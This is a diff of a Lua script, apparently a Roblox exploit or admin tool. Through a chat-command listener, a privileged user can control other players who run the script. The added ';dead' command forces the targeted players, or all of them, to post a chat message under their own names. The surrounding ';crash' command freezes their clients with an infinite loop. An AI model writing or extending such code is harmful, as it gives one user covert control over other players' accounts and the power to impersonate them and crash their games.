@@ -85,6 +85,14 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
+
+elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟⭐dead was here⭐🌟")
+	elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟⭐dead was here⭐🌟")
+
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 while true do end
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
